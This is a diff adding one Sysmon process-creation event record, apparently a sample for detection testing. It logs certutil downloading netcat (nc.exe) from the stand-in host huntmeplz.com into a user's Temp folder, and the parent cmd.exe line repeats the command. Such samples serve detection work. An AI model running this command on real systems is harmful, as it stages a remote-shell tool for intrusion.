@@ -1,0 +1,23 @@
+Field:	Value
+CommandLine:	certutil -urlcache -split -f http://huntmeplz.com/nc.exe C:\Users\victim\AppData\Local\Temp\nc.exe
+Company	Microsoft Corporation
+CurrentDirectory:	C:\Users\victim\Downloads\
+Description:	CertUtil.exe
+EventID:	1
+Field: 	Value
+FileVersion:	10.0.17763.1 (WinBuild.160101.0800)
+Hashes:	MD5=FD60D24DDCCDFAE396F0D2349F040484,SHA256=555A8B4B7C5E9614E3EF7AF2FAFC6181AA98AD9D10EBFD845D82F33EFEB7E1C7,IMPHASH=E8D77122DFEFBA52E492A9E89B1F9BEB
+Image:	C:\Windows\SysWOW64\certutil.exe
+IntegrityLevel:	Medium
+LogonGuid:	{4bbef3ae-81e4-630c-b94b-100000000000}
+LogonId:	0x104bb9
+OriginalFileName:	CertUtil.exe
+ParentCommandLine:	"C:\Windows\System32\cmd.exe" /c certutil -urlcache -split -f http://huntmeplz.com/nc.exe C:\Users\victim\AppData\Local\Temp\nc.exe
+ParentImage:	C:\Windows\SysWOW64\cmd.exe
+ParentProcessGuid:	{4bbef3ae-cbcf-630c-020f-000000000e00}
+ParentProcessId:	10284
+ParentUser:	User\victim
+ProcessGuid:	{4bbef3ae-cbcf-630c-060f-000000000e00}
+ProcessId:	8892
+Product:	Microsoft® Windows® Operating System
+RuleName:	-
